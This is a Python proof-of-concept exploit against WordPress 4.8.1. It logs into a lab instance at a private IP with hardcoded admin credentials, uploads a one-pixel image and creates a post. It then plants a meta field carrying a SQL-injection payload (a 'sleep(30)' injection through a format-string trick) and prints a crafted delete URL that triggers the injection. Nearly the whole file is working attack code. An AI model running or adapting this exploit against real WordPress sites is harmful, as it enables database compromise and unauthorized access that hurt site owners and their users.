#!/usr/bin/env python3

#This exploit needs wordpress 4.8.1
import requests
import urllib

def getField(p, nonceName):
    try:
        val = p.split('name="' + nonceName + '" value="')[1]
        val = val.split('"')[0]
    except IndexError:
        val = p.split("name='" + nonceName + "' value='")[1]
        val = val.split("'")[0]
    return val


ip = '192.168.56.101'
log = 'admin'
pw = '123456789'
command = "sleep(30)"
wp_submit = 'Anmelden'
redirect_to = 'http://' + ip + '/wordpress/wp-admin/'
payload = { 'log': log, 'pwd': pw, 'wp_submit': wp_submit, 'redirect_to': redirect_to}

#One pixel image in binary
pic =   b"""\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00
        \x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x09
        \x70\x48\x59\x73\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00
        \x00\x07\x74\x49\x4d\x45\x07\xe3\x03\x0f\x09\x11\x29\x5d\x7d\x29\xf9\x00\x00
        \x00\x1d\x69\x54\x58\x74\x43\x6f\x6d\x6d\x65\x6e\x74\x00\x00\x00\x00\x00\x43
        \x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\x64\x2e\x65
        \x07\x00\x00\x00\x0c\x49\x44\x41\x54\x08\xd7\x63\xf8\xff\xff\x3f\x00\x05\xfe
        \x02\xfe\xdc\xcc\x59\xe7\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82"""

#needed urls
upload_url = 'http://' + ip + '/wordpress/wp-admin/media-new.php'
login_url = 'http://' + ip + '/wordpress/wp-login.php'
async_upload = 'http://' + ip + '/wordpress/wp-admin/async-upload.php'
new_post_url = 'http://' + ip + '/wordpress/wp-admin/post-new.php'
profile_url = 'http://' + ip + '/wordpress/wp-admin/profile.php'
edit_url = 'http://' + ip + '/wordpress/wp-admin/edit.php'
post_url = 'http://' + ip + '/wordpress/wp-admin/post.php'
ajax_url = 'http://' + ip + '/wordpress/wp-admin/admin-ajax.php'

#make requests
with requests.Session() as s:
    #login
    p = s.post(login_url, data=payload)

    #get nonce
    p = s.get(upload_url)
    nonce = p.text.split('_wpnonce" value="')[1]
    nonce = nonce.split('"')[0]
    
    #upload post request
    up_files = {
        'name': (None, 'pixel.png'),
        'post_id': (None, str(0)),
        '_wpnonce': (None, str(nonce)),
        'type': (None, ''),
        'tab': (None, ''),
        'short': (None, '1'),
        'async-upload': ('pixel.png', pic, 'image/png')
    }
    
    #upload and get thumbnail ID
    p = s.post(async_upload, files=up_files)
    thumb_id = p.text

    #get userID
    p = s.get(profile_url)
    userID = p.text.split('user_id" value="')[1]
    userID = userID.split('"')[0]

    #get required nonces to edit
    p = s.get(new_post_url)
    nonce = getField(p.text, "_wpnonce")
    postID = getField(p.text, "post_ID")
    metaboxordernonce = getField(p.text, "meta-box-order-nonce")
    closedpostboxesnonce = getField(p.text, "closedpostboxesnonce")
    samplepermalinknonce = getField(p.text, "samplepermalinknonce")
    ajax_nonce_add_category = getField(p.text, "_ajax_nonce-add-category")
    ajax_nonce_add_meta = getField(p.text, "_ajax_nonce-add-meta")

    #edit request
    post_data= {
        '_wpnonce': nonce,
        '_wp_http_referer': '/wordpress/wp-admin/post-new.php',
        'user_ID': userID,
        'action': 'editpost',
        'originalaction': 'editpost',
        'post_author': userID,
        'post_type': 'post',
        'original_post_status': 'auto-draft',
        'referredby': 'http://' + ip + '/wordpress/wp-admin/edit.php',
        '_wp_original_http_referer': 'http://' + ip + '/wordpress/wp-admin/edit.php',
        'auto_draft': '1',
        'post_ID': postID,
        'meta-box-order-nonce': metaboxordernonce,
        'closedpostboxesnonce': closedpostboxesnonce,
        'post_title': 'PWNED',
        'samplepermalinknonce': samplepermalinknonce,
        'content': '',
        'wp-preview': '',
        'hidden_post_status': 'draft',
        'post_status': 'draft',
        'hidden_post_password': '',
        'hidden_post_visibility': 'public',
        'visibility': 'public',
        'post_password': '',
        'jj': '15',
        'mm': '03',
        'aa': '2019',
        'hh': '07',
        'mn': '16',
        'ss': '07',
        'hidden_mm': '03',
        'cur_mm': '03',
        'hidden_jj': '15',
        'cur_jj': '15',
        'hidden_aa': '2019',
        'cur_aa': '2019',
        'hidden_hh': '07',
        'cur_hh': '07',
        'hidden_mn': '16',
        'cur_mn': '16',
        'original_publish': 'Veröffentlichen',
        'publish': 'VeröB6ffentlichen',
        'post_format': '0',
        'post_category[]': '0',
        'newcategory': 'Neuer+Kategoriename',
        'newcategory_parent': '-1',
        '_ajax_nonce-add-category': ajax_nonce_add_category,
        'tax_input[post_tag]': '',
        'newtag[post_tag]': '',
        '_thumbnail_id': thumb_id,
        'excerpt': '',
        'trackback_url': '',
        'metakeyinput': '',
        'metavalue': '',
        '_ajax_nonce-add-meta': ajax_nonce_add_meta,
        'advanced_view': '1',
        'comment_status': 'open',
        'ping_status': 'open',
        'post_name': '',
        'post_author_override': '1'
    }
    p = s.post(post_url, data=post_data)

    #add meta field to database
    post_data = {
        '_ajax_nonce': 0,
        'action': 'add-meta',
        'metakeyinput': '\x00_thumbnail_id',
        'metavalue': thumb_id + ' %1$%s OR ' + command + '#',
        '_ajax_nonce-add-meta': ajax_nonce_add_meta,
        'post_id': postID
    }
    p = s.post(ajax_url, data=post_data)

    p = s.get(edit_url)
    nonce = p.text.split('<p class="search-box">')[1]
    nonce = getField(nonce, '_wpnonce')

    #print exploit url
    exploit = 'http://' + ip + '/wordpress/wp-admin/edit.php?action=delete&_wpnonce=' + nonce + '&ids=' + thumb_id + '%20%251%24%25s%20OR%20' + urllib.parse.quote(command) + '%23'
    print(exploit)
